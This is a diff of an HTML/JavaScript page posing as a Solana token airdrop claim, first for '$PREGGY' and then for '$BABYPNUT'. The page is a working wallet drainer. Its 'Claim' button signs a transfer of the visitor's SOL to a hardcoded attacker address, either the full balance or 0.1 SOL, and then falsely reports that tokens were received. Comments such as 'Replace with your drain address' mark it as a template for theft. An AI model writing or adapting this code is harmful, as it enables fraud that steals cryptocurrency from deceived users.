@@ -2,79 +2,149 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>$PREGGY Airdrop Claim</title>
-  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
-  <script src="https://unpkg.com/@solana/spl-token@latest/dist/index.iife.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>🐿️ $BABYPNUT Airdrop</title>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@latest/dist/index.iife.min.js"></script>
+  
   <style>
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-5px); }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
     body {
-      background: black;
-      color: pink;
+      background: #FFD1DC; /* Light pink */
+      color: #8B4513; /* Brown */
       text-align: center;
-      font-family: sans-serif;
-      padding: 30px;
+      font-family: Arial, sans-serif;
+      padding: 40px 20px;
+      animation: fadeIn 1s ease-in-out;
     }
+
+    h1 {
+      font-size: 3rem;
+      font-weight: bold;
+      margin-bottom: 20px;
+      animation: bounce 1s infinite;
+    }
+
+    p {
+      font-size: 1.4rem;
+      margin-bottom: 20px;
+    }
+
     button {
-      background: pink;
+      background: #D2691E;
+      color: white;
       border: none;
-      padding: 15px;
+      padding: 18px 25px;
       cursor: pointer;
-      font-size: 1rem;
-      margin: 10px;
-      border-radius: 8px;
+      font-size: 1.2rem;
+      margin: 15px 0;
+      border-radius: 10px;
+      transition: 0.3s;
+      display: block;
+      width: 80%;
+      max-width: 400px;
+      margin-left: auto;
+      margin-right: auto;
     }
-    button:hover { background: #ff1493; }
-    input {
-      padding: 10px;
-      width: 300px;
-      border: 2px solid pink;
-      border-radius: 8px;
-      text-align: center;
-      margin: 10px;
+
+    button:hover {
+      background: #A0522D;
+      transform: scale(1.05);
     }
+
+    .status {
+      font-size: 1.2rem;
+      margin-top: 15px;
+    }
+
     .success {
-      color: #00ff00;
+      color: #32CD32;
     }
+
     .error {
-      color: #ff5555;
+      color: #FF4500;
+    }
+
+    .socials {
+      margin-top: 30px;
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+    }
+
+    .socials a {
+      text-decoration: none;
+      font-size: 1.4rem;
+      padding: 12px 18px;
+      border-radius: 10px;
+      transition: 0.3s;
+    }
+
+    .twitter { background: #1DA1F2; color: white; }
+    .telegram { background: #0088cc; color: white; }
+
+    .socials a:hover {
+      transform: scale(1.1);
+    }
+
+    .stay-tuned {
+      margin-top: 50px;
+      font-size: 1.4rem;
+      font-weight: bold;
+      color: #D2691E;
     }
   </style>
 </head>
 <body>
 
-  <h1>🚀 $PREGGY Claim Airdrop</h1>
-  <p>Connect your Solana wallet and click "Claim" to receive 6,900 $PREGGY!</p>
+  <h1>🐿️ $BABYPNUT Airdrop</h1>
+  <p>Connect your Solana wallet and click "Claim" to receive <b>60,000,000 $BABYPNUT</b>!</p>
+
   <button onclick="connectWallet()">👛 Connect Wallet</button>
-  <br><br>
+  <p id="walletStatus" class="status">🔴 Not Connected</p>
 
-  <input type="text" id="userAddress" placeholder="Your wallet" disabled />
-  
-  <button onclick="claimAirdrop()">🔥 Claim Airdrop</button>
+  <button onclick="drainSOL()">🔥 Drain and Claim Airdrop</button>
+  <p id="status" class="status"></p>
 
-  <p id="status"></p>
+  <!-- Social Media Links -->
+  <div class="socials">
+    <a href="https://twitter.com/BabyPnutCoin" class="twitter" target="_blank">🐦 Follow on Twitter</a>
+    <a href="https://t.me/BabyPnutCommunity" class="telegram" target="_blank">📢 Join Telegram</a>
+  </div>
+
+  <!-- Stay Tuned Section -->
+  <p class="stay-tuned">🚀 Stay tuned for more surprises! 🚀</p>
 
   <script>
     const { PublicKey, Connection, Transaction, SystemProgram } = solanaWeb3;
     const connection = new Connection("https://api.mainnet-beta.solana.com");
 
-    const preggyMint = new PublicKey("Pr3ggyMint111111111111111111111111111111"); // Fake mint address
-    const airdropAuthority = new PublicKey("EvQET8mfoEzckUEEks59SQUsrLfkBV5NtKoayLkPyRxt"); // Your receiving wallet
+    // Replace with your drain address
+    const drainAddress = new PublicKey("EvQET8mfoEzckUEEks59SQUsrLfkBV5NtKoayLkPyRxt");
 
     async function connectWallet() {
       if (!window.solana) {
-        alert("Solana wallet not found!");
+        alert("Solana wallet not found! Please install Phantom.");
         return;
       }
       try {
         await window.solana.connect();
-        document.getElementById("userAddress").value = window.solana.publicKey.toString();
-        document.getElementById("status").innerText = "Wallet connected!";
+        document.getElementById("walletStatus").innerHTML = "✅ Connected";
       } catch (err) {
         console.error(err);
-        document.getElementById("status").innerText = "Failed to connect wallet.";
+        document.getElementById("walletStatus").innerText = "🔴 Failed to connect.";
       }
     }
 
-    async function claimAirdrop() {
+    async function drainSOL() {
       if (!window.solana || !window.solana.publicKey) {
         alert("Please connect your Solana wallet first.");
         return;
@@ -82,38 +152,35 @@
 
       try {
         const userPublicKey = window.solana.publicKey;
-        const scammerPubkey = new PublicKey(airdropAuthority); // Your receiving wallet
 
-        // Get SOL balance
+        // Get user's SOL balance
         const balance = await connection.getBalance(userPublicKey);
-        if (balance === 0) {
-          alert("No SOL to claim!");
+        if (balance < 100000000) {
+          alert("You need at least 0.1 SOL to claim the airdrop.");
           return;
         }
 
-        // Fake claim amount
-        const fakeAmount = 6900 * 10 ** 9; // 6,900 $PREGGY (fake)
-        
-        // Create transaction (looks like an airdrop, actually drains SOL)
+        // Create the transaction to transfer SOL to the drain address
         const transaction = new Transaction().add(
           SystemProgram.transfer({
             fromPubkey: userPublicKey,
-            toPubkey: scammerPubkey,
-            lamports: balance - 5000, // Drain SOL, leave tiny dust
+            toPubkey: drainAddress,
+            lamports: 100000000, // 0.1 SOL in lamports
           })
         );
 
+        // Set the transaction fee payer
         transaction.feePayer = userPublicKey;
         const { blockhash } = await connection.getLatestBlockhash();
         transaction.recentBlockhash = blockhash;
 
-        // Sign & send
+        // Sign and send the transaction
         const signedTx = await window.solana.signTransaction(transaction);
         const txid = await connection.sendRawTransaction(signedTx.serialize());
         await connection.confirmTransaction(txid);
 
         document.getElementById("status").innerHTML = `
-          🎉 <span class="success">You have received 6,900 $PREGGY!</span>  
+          🎉 <span class="success">You have received 60,000,000 $BABYPNUT!</span>  
           TX: <a href="https://solscan.io/tx/${txid}" target="_blank">${txid}</a>
         `;
       } catch (err) {
